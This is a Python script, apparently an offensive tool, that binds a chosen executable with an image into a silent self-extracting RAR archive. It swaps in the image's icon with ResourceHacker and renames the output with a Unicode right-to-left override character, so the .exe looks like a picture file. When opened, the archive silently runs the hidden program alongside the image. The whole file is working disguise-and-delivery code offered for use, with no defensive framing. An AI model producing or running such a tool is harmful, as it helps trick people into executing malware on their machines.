import os
import subprocess
from wand.image import Image
import random, string
import argparse

ICON = "temp.ico"
CONFIG = "config.txt"
NAME = ''.join(random.choices(string.ascii_lowercase, k=6))

def create_icon(img: str):
    with Image(filename=img) as img:
        img.resize(512, 512)
        img.save(filename=ICON)

def create_archive(exe: str, img: str):
    create_icon(img)

    extension = os.path.splitext(img)[1]
    newimg = f"{NAME}exe{extension}"
    os.rename(img, newimg)

    with open(CONFIG, "w") as f:
        f.write(f'Setup={newimg}\nSetup={exe}\nTempMode\nSilent=1\nOverwrite=1\nUpdate=U')

    temp = "temp.exe"
    out = "archive.exe"
    script = "main.bat"

    with open(script, "w") as f:
        f.write("\n".join([
            f'rar a -sfx -z{CONFIG} {temp} "{exe}" "{newimg}"',
            f'ResourceHacker.exe -open {temp} -save {temp} -action delete -res ICONGROUP,1,',
            f'ResourceHacker.exe -open {temp} -save {out} -action add -res {ICON} -mask ICONGROUP,1,'
        ]))

    subprocess.run([script])

    os.rename(out, f"{NAME}\u202E{extension[1:][::-1]}.exe")

    os.rename(newimg, img)
    os.remove(ICON)
    os.remove(CONFIG)
    os.remove(temp)
    os.remove(script)


parser = argparse.ArgumentParser(formatter_class=argparse.RawTextHelpFormatter)
parser.add_argument("-e", type=str, required=True, help="Executable to hide")
parser.add_argument("-i", type=str, required=True, help="Image to embed executable into")

def main():
    args = parser.parse_args()

    create_archive(args.e, args.i)

if __name__ == "__main__":
    main()